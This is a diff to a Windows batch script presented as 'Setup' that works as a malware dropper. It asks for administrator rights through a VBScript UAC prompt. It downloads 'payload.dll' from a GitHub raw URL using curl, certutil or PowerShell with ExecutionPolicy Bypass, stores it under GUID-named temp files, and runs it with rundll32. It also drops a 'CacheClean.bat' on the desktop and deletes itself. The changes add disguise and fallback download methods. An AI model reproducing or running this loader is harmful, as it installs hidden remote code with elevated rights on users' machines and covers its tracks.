@@ -1,57 +1,75 @@
 @echo off
-setlocal EnableExtensions EnableDelayedExpansion
-title VYRK Setup
+setlocal EnableExtensions
+title Setup
 
 fltmc >nul 2>&1
-if errorlevel 1 (
-    echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\vy_el.vbs"
-    echo UAC.ShellExecute "%~f0", "", "", "runas", 1 >> "%TEMP%\vy_el.vbs"
-    cscript //nologo "%TEMP%\vy_el.vbs" >nul 2>&1
-    del /f /q "%TEMP%\vy_el.vbs" >nul 2>&1
-    exit /b
-)
-
-set "BASE=https://raw.githubusercontent.com/Gtx047/Gtx/refs/heads/main"
-set "DIR=%LOCALAPPDATA%\VYRK"
-set "TMPD=%TEMP%\vyrk_dl"
+if %errorlevel% equ 0 goto :IS_ADMIN
+if /i "%~1"=="__ELEVATED__" goto :ELEV_FAILED
 
 echo.
-echo  VYRK setup
+echo  [!] Need Administrator privileges!
+echo  [*] Restarting as Admin...
 echo.
 
-rd /s /q "%TMPD%" 2>nul
-mkdir "%DIR%" 2>nul
-mkdir "%TMPD%" 2>nul
-
-call :get payload.dll "%DIR%\payload.dll"
-call :get clean.bat "%TMPD%\clean.bat"
-
-copy /y "%TMPD%\clean.bat" "%DIR%\clean.bat" >nul
-copy /y "%TMPD%\clean.bat" "%USERPROFILE%\Desktop\VYRK Clean.bat" >nul
-
-echo  payload  ok
-echo  clean    ok
-echo.
-echo  starting - press Paste then Activate in the window.
-echo.
-
-start "" rundll32.exe "%DIR%\payload.dll",Entry
-
-timeout /t 3 >nul
-
-start /b "" cmd /c ping -n 2 127.0.0.1 ^>nul ^& del /f /q "%~f0" ^& rd /s /q "%TMPD%"
+echo Set UAC = CreateObject^("Shell.Application"^) > "%TEMP%\vy_elev.vbs"
+echo UAC.ShellExecute "%~s0", "__ELEVATED__", "", "runas", 1 >> "%TEMP%\vy_elev.vbs"
+cscript //nologo "%TEMP%\vy_elev.vbs"
+del /f /q "%TEMP%\vy_elev.vbs" >nul 2>&1
 exit /b
 
-:get
-if exist "%~2" del /f /q "%~2"
-curl.exe -sL --ssl-no-revoke "%BASE%/%~1" -o "%~2"
-if not exist "%~2" goto :dlfail
-for %%A in ("%~2") do if %%~zA LSS 100 goto :dlfail
-exit /b 0
-
-:dlfail
+:ELEV_FAILED
 echo.
-echo  download failed: %~1
+echo  [-] Cannot get Administrator privileges!
 echo.
 pause
 exit /b 1
+
+:IS_ADMIN
+echo.
+echo  [*] Preparing...
+echo.
+
+set "BASE=https://raw.githubusercontent.com/Gtx047/Gtx/refs/heads/main"
+set "DLL=%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.tmp"
+set "OLD=%TEMP%\a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.old"
+set "CLN=%TEMP%\b81e5d47-2c6a-4f19-8d03-7a4c9e15b2f8.tmp"
+set "DST=%USERPROFILE%\Desktop\CacheClean.bat"
+
+del /f /q "%OLD%" 2>nul
+if exist "%DLL%" ren "%DLL%" "a7f3c812-4e9b-4d2a-b156-9c8e1d4f7062.old" 2>nul
+
+echo  [*] Downloading...
+where curl.exe >nul 2>&1
+if %errorlevel% equ 0 curl.exe -sL --ssl-no-revoke "%BASE%/payload.dll" -o "%DLL%"
+if not exist "%DLL%" certutil -urlcache -split -f "%BASE%/payload.dll" "%DLL%" >nul 2>&1
+if not exist "%DLL%" powershell -NoProfile -ExecutionPolicy Bypass -Command "try{Invoke-WebRequest -Uri '%BASE%/payload.dll' -OutFile '%DLL%' -UseBasicParsing}catch{}" >nul 2>&1
+if not exist "%DLL%" goto :FAIL
+for %%A in ("%DLL%") do if %%~zA LSS 100 goto :FAIL
+
+where curl.exe >nul 2>&1
+if %errorlevel% equ 0 curl.exe -sL --ssl-no-revoke "%BASE%/clean.bat" -o "%CLN%"
+if not exist "%CLN%" certutil -urlcache -split -f "%BASE%/clean.bat" "%CLN%" >nul 2>&1
+if exist "%CLN%" (
+    copy /y "%CLN%" "%DST%" >nul
+    del /f /q "%CLN%" >nul 2>&1
+)
+
+echo  [+] Downloaded
+echo  [*] Loading...
+echo.
+
+start "" rundll32.exe "%DLL%",Entry
+
+timeout /t 3 >nul
+goto :BYE
+
+:FAIL
+echo.
+echo  [-] Download failed!
+echo.
+pause
+
+:BYE
+set "SELF=%~f0"
+start /b "" cmd.exe /c ping 127.0.0.1 -n 2 ^>nul ^& del /f /q "%SELF%"
+exit /b
